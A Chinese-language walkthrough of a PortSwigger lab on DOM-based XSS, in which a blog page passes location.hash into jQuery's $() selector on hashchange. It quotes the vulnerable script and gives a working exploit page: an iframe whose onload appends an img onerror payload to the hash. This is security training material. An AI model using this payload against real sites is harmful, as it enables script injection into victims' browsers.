# 实验：在使用 hashchange 事件的 jQuery 选择器汇点中的 DOM XSS

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event

本实验在主页中包含一个基于 DOM 的跨站脚本（XSS）漏洞。它使用 jQuery 的 `$()` 选择器函数自动滚动到指定的帖子，该帖子的标题通过 `location.hash` 属性传递。

为了解决本实验，请向受害者交付一个利用程序，使其在浏览器中调用 `print()` 函数。

##  步骤

侦察
- 访问主页
    - 响应
        ```html
        <script src="/resources/js/jquery_1-8-2.js"></script>
        <script src="/resources/js/jqueryMigrate_1-4-1.js"></script>
        <script>
            $(window).on('hashchange', function() {
                var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                if (post) post.get(0).scrollIntoView();
            });
        </script>
        ```
        - 揭示 jquery 版本
        - 触发事件 `hashchange`
        - 源 `window.location.hash`
        - 汇 `$()`

- 攻击
    - 在攻击者顶级页面构造包含子框架的载荷页面
        ```html
        <iframe 
            src="https://脆弱目标页面#" 
            onload="this.src+='<img src onerror=print()>'"
        ></iframe>
        ```
    - 加载后子框架 src 属性变化
        - 子框架内事件监听器执行
        - 应用 hash 片段的 JS 载荷
    - 发送到受害者

总结
1. 子框架的 `src` 属性指向带有空哈希值的易受攻击页面
2. 当顶级页面的 `iframe` 加载时，顶级页面的 `onload` 事件触发：
    - XSS 向量被附加到子框架 `src` 属性的 URL 的哈希片段中
3. 子框架重载更新后的 URL，子框架内：
    1. 触发 `hashchange` 事件。
    2. 载荷由源 `location.hash` 进入汇 `$()`，导致 JS 执行

此处攻击者控制的顶级页面修改子框架元素的 src 属性，而无关同源策略中访问子框架 DOM 的限制
